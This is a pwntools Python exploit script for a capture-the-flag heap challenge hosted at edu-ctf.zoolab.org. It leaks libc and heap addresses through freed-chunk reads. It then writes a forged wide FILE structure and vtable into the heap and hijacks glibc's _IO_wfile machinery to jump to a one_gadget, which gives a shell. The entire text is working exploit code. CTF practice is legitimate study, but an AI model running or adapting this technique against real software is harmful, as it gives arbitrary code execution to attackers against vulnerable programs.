from pwn import *
## https://bbs.pediy.com/thread-273832.htm#%E5%88%A9%E7%94%A8_io_wdefault_xsgetn%E5%87%BD%E6%95%B0%E6%8E%A7%E5%88%B6%E7%A8%8B%E5%BA%8F%E6%89%A7%E8%A1%8C%E6%B5%81
def add(idx, name):
    r.sendafter(b'> ',b'1')
    r.sendlineafter(b'> ',str(idx))
    r.sendafter(b'> ',name)


def edit(idx, size, data):
    r.sendafter(b'> ',b'2')
    r.sendlineafter(b'> ',str(idx))
    r.sendlineafter(b'> ',str(size))
    r.send(data)

def delete(idx):
    r.sendafter(b'> ',b'3')
    r.sendlineafter(b'> ',str(idx))

def show():
    r.sendafter(b'> ',b'4')


#r = process('./share/chal')
r = remote('edu-ctf.zoolab.org',10011)
add(0,b'ccccc')
edit(0,0x68,b'c')
add(1,b'c')
delete(0)
edit(1,0x58,b'c')
show()

r.recvuntil(b'data: c')
libc_base = u64(b'\x00' + r.recv(5) + b'\x00\x00') - 0x1ed200
print(hex(libc_base))
delete(1)
show()

r.recvuntil(b'[1] ')
heap_base = u64(r.recv(6) + b'\x00\x00') - 0x2a0
print(hex(heap_base))

system = libc_base + 0x52290
free_hook = libc_base + 0x1eee48
IO_wfile_jumps = libc_base + 0x1e8f60
IO_wstrn_jumps = libc_base + 0x1e8c60
one_gadget = libc_base + 0xe3afe

fake_wide_vtable = b''.ljust(0x68,b'\x00')
fake_wide_vtable +=  p64(one_gadget)
edit(1,0x90,fake_wide_vtable)

fake_wide_file = p64(0) * 4 + p64(0)
fake_wide_file = fake_wide_file.ljust(0xe0,b'\x00')
fake_wide_file += p64(heap_base + 0x580)

edit(1,0x1ff,fake_wide_file)


# add(2,b'123')
# edit(2,0x78,b'123')
# delete(2)


# # #input()
payload = b''.ljust(8,b'\x00')
payload += p64(0) + p64(1)
payload = payload.ljust(0x88,b'\x00')
payload += p64(free_hook) # lock
payload = payload.ljust(0xa0,b'\x00')
payload += p64(heap_base + 0x620) # wide_data
payload = payload.ljust(0xc0,b'\x00')
payload += p64(1)
payload = payload.ljust(0xd8,b'\x00')
payload += p64(libc_base + 0x1e8eb0) # _IO_wfile_underflow_mmap
edit(1,0x1d8,payload)
delete(1)
r.interactive()
